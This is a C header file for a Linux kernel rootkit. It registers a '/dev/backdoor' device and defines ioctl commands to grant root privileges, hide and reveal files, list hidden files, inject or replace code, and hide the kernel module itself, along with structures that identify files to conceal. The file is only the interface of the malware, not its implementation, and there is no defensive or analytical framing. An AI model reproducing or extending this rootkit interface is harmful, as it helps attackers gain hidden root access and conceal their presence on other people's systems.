#ifndef BDOOR_COMMON_LIB
#define BDOOR_COMMON_LIB 1
#include <asm/ioctl.h>

#ifndef __KERNEL__
#include <sys/types.h>
#include <stdint.h>
#else
#include <linux/types.h>
#endif

#define BDOOR_DEV_MINOR 42
#define BDOOR_DEV_NAME "backdoor"
#define BDOOR_DEV_PATH "/dev/backdoor"

struct hide_request;
struct dentry_identifier;

//ioctls for our interface
#define ROOT_IOCTL         _IO('k', 1)
#define UNROOT_IOCTL       _IO('k', 2)
#define URAND_IOCTL        _IO('k', 3)
#define HIDE_IOCTL         _IOW('k', 4,struct hide_request)
#define SHOW_IOCTL         _IOW('k', 5,struct hide_request)
#define LIST_HIDDEN_IOCTL  _IO('k', 6)
#define INJECT_IOCTL       _IO('k', 7)
#define REPLACE_IOCTL      _IO('k', 8)
#define HIDE_MOD_IOCTL     _IO('k', 9)
#define SHOW_MOD_IOCTL     _IO('k', 10)

#define procfs_file_name "hidden_files"

struct dentry_identifier {
	ino_t parent_ino;
#ifdef __KERNEL__
	dev_t device;
#else
	uint32_t device;
#endif
        unsigned int name_len;
	char name[256];
}__attribute__((packed));


struct hide_request {
	int count;
	struct dentry_identifier *idents;
};
#endif
